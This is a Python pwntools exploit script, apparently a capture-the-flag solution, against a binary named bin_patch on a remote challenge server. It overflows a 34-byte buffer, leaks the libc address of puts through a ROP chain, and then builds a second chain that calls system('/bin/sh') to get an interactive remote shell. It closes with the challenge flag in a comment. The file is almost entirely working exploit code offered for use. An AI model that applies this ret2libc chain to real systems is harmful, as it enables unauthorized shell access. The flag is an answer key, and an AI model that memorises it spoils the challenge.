#!/usr/bin/python3
import struct
from pwn import *
elf = context.binary = ELF("./bin_patch")
libc = ELF('libc.so.6')
context.log_level = "DEBUG"
context.timeout = 5
gs = '''
b *0x401240
'''

# 0x40130c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x401281 call    _read
# 0x4006ce call print_f
# 0x401313 : pop rdi ; ret
# 0x401240 main
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        # return process(elf.path)
        return remote('mc.ax', 31081)

main=0x401240
putsPLT= int(hex(4198448),16)
popRDI=0x401313
popr12r13=0x40130c
putsGOT=elf.got['puts']
ret = 0x40101a
io = start()
print(elf.plt)
# msf=cyclic_metasploit(50)
padd=b'A'*34
print('> ',io.recvuntil('join DiceGang?'))
io.sendline(padd+p64(popRDI)+p64(elf.got['puts'])+p64(elf.plt['puts']) + p64(main))
print('> ',io.recvuntil(b'A'*34))
leakBin = io.recvline()[:-1]
leakBin = u64(leakBin.ljust(8,b'\x00'))
print('[+] leak> ',hex(leakBin))
leakLibc = u64(io.recvline()[:-1].ljust(8,b'\x00'))
print('[+] leak> ',hex(leakLibc))
libc.address = leakLibc - libc.symbols['puts']
print('[+] libc',hex(libc.address))
# one=libc.address+0xcbd1a
# print('[+] One',hex(one))
system = libc.symbols['system']
sh = next(libc.search(b'/bin/sh\x00'))
print('[+] System',hex(system))
print('[+] SH',hex(sh))
# 0x40130c
print('> ',io.recvuntil('join DiceGang?'))
io.sendline(padd+p64(popRDI)+p64(sh)+p64(system)+p64(ret))
io.interactive()
# dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}